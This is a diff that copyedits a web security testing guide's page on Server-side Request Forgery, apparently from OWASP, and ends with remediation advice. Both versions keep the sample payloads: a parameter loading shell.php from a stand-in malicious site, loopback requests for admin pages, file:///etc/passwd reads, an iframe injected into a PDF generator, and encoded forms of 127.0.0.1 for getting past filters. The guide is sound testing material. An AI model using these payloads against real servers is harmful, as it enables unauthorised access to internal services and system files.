@@ -6,7 +6,7 @@
 
 ## Summary
 
-Often web applications may have to interact with internal or external resources in order to provide certain functionality, with the expectation that only the service providing that functionality will be used, but often such functionality processes user data and if not handled properly it can open the door for injection attacks that are called Server-side Request Forgery (SSRF). A successful SSRF attack can grant the attacker access to restricted actions, internal services, or internal files within the application or the organization. In some cases it can even lead to Remote Code Execution (RCE).
+Web applications often interact with internal or external resources. While you may expect that only the intended resource will be handling the data you send, improperly handled data may create a situation where injection attacks are possible. One type of injection attack is called Server-side Request Forgery (SSRF). A successful SSRF attack can grant the attacker access to restricted actions, internal services, or internal files within the application or the organization. In some cases, it can even lead to Remote Code Execution (RCE).
 
 ## Test Objectives
 
@@ -16,46 +16,56 @@ Often web applications may have to interact with internal or external resources 
 
 ## How to Test
 
-When testing for SSRF we are trying to trick the server into loading/writing unintended content. The most common test is for local and remote file inclusion, but there is another facet to SSRF, a trust relationship that often arises with server-side request forgery where the application server is able to interact with other back-end systems that are not directly reachable by users. These systems often have non-routable private IP addresses or are restricted to certain hosts. Since they are protected by the network topology, they often lack more sophisticated controls. However internal systems often contain sensitive data or functionality.
+When testing for SSRF, you attempt to make the targeted server inadvertently load or save content that could be malicious. The most common test is for local and remote file inclusion. There is also another facet to SSRF: a trust relationship that often arises where the application server is able to interact with other back-end systems that are not directly reachable by users. These back-end systems often have non-routable private IP addresses or are restricted to certain hosts. Since they are protected by the network topology, they often lack more sophisticated controls. These internal systems often contain sensitive data or functionality.
+
+Consider the following request:
 
 ``` http
 GET https://example.com/page?page=about.php
 ```
 
-If we have the above request we can test with the following payloads:
+You can test this request with the following payloads.
 
-**Loading the contents of a file:**
+### Load the Contents of a File
 
 ```http
 GET https://example.com/page?page=https://malicioussite.com/shell.php
 ```
 
-**Get access to a restricted page:**
+### Access a Restricted Page
 
 ```http
 GET https://example.com/page?page=http://localhost/admin
+```
 
-OR
+Or:
 
+```http
 GET https://example.com/page?page=http://127.0.0.1/admin
 
 ```
 
-Use the loopback interface to access content restricted to the host only. This mechanism implies that if you have access to the host then you have enough privileges to directly access the `admin` page.
-These kind of trust relationships, where requests originating from the local machine are handled differently than ordinary requests, are often what makes SSRF into a critical vulnerability.
+Use the loopback interface to access content restricted to the host only. This mechanism implies that if you have access to the host, you also have privileges to directly access the `admin` page.
 
-**Fetch a local file:**
+These kind of trust relationships, where requests originating from the local machine are handled differently than ordinary requests, are often what enables SSRF to be a critical vulnerability.
 
-`https://example.com/page?page=file:///etc/passwd`
+### Fetch a Local File
+
+```http
+GET https://example.com/page?page=file:///etc/passwd
+```
+
+### HTTP Methods Used
 
 All of the payloads above can apply to any type of HTTP request, and could also be injected into header and cookie values as well.
-One important note on SSRF with POST requests is that the SSRF may also manifest in a Blind manner, because the application might not return anything immediately, that data might be used in other functionality such as PDF reports, invoice/order handling, etc. which are visible to employees/staff but not necessarily the end user or tester.
 
-You can find more on Blind SSRF [here](https://portswigger.net/web-security/ssrf/blind), or in the [References section](#references).
+One important note on SSRF with POST requests is that the SSRF may also manifest in a blind manner, because the application may not return anything immediately. Instead, the injected data may be used in other functionality such as PDF reports, invoice or order handling, etc., which may be visible to employees or staff but not necessarily to the end user or tester.
+
+You can find more on Blind SSRF [here](https://portswigger.net/web-security/ssrf/blind), or in the [references section](#references).
 
 ### PDF Generators
 
-There are some cases where server converts uploaded file to a pdf.Try injecting `<iframe>`, `<img>`, `<base>` or `<script>` elements or CSS `url()` functions pointing to internal services.
+In some cases, a server may convert uploaded files to PDF format. Try injecting `<iframe>`, `<img>`, `<base>`, or `<script>` elements, or CSS `url()` functions pointing to internal services.
 
 ```html
 <iframe src="file:///etc/passwd" width="400" height="400">
@@ -64,9 +74,9 @@ There are some cases where server converts uploaded file to a pdf.Try injecting 
 
 ### Common Filter Bypass
 
-Some applications block references to `localhost` and `127.0.0.1`, this can be circumvented by:
+Some applications block references to `localhost` and `127.0.0.1`. This can be circumvented by:
 
-- Using alternative IP representation such as the below examples that evaluate to `127.0.01`:
+- Using alternative IP representation that evaluate to `127.0.01`:
   - Decimal notation: `2130706433`
   - Octal notation: `017700000001`
   - IP shortening: `127.1`
@@ -81,11 +91,11 @@ Sometimes the application allows input that matches a certain expression, like a
 - Fuzzing
 - Combinations of all of the above
 
-For additional payloads and bypass techniques, check the [references](#references) section.
+For additional payloads and bypass techniques, see the [references](#references) section.
 
 ## Remediation
 
-SSRF is known to be one of the hardest attacks to block or stop without the use of allow lists that require specific IPs and URLs to be allowed. For more on SSRF prevention, check out the [Server Side Request Forgery Prevention Cheatsheet](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html).
+SSRF is known to be one of the hardest attacks to defeat without the use of allow lists that require specific IPs and URLs to be allowed. For more on SSRF prevention, read the [Server Side Request Forgery Prevention Cheatsheet](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html).
 
 ## References
 
